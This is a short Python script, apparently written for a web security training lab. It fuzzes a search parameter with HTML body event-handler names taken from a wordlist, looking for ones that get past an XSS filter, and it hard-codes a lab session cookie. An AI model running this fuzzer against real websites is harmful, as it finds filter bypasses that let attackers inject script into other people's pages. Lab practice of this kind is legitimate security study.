import requests

def read_wordlist(file_path):
    with open(file_path, 'r') as file:
        # Read each line and strip newline characters
        return [line.strip() for line in file]

# Path to the wordlist file
wordlist_path = "C:\\xss events.txt"

# Load the wordlist from the file
wordlist = read_wordlist(wordlist_path)


url = "https://0ae500890438f12283a97bd7009400ca.web-security-academy.net/?search=<body {}=1>"

headers = {
    "Cookie": "session=Nr7UeaZvSTxqfwiXxcfFwtnUZo43OLrm"
}

payloads = []
def Fuzz():
    for item in wordlist:
        print(f"Trying : {item}")
        payload = url.format(item)
        req = requests.get(url=payload, headers=headers)
        if req.status_code == 200:
            print(f"Payload found: {item}")
            payloads.append(item)
            # Optionally, you may want to break here if you only want to find the first match
            # break

Fuzz()

print(f"PAYLOADS : [{payloads}]")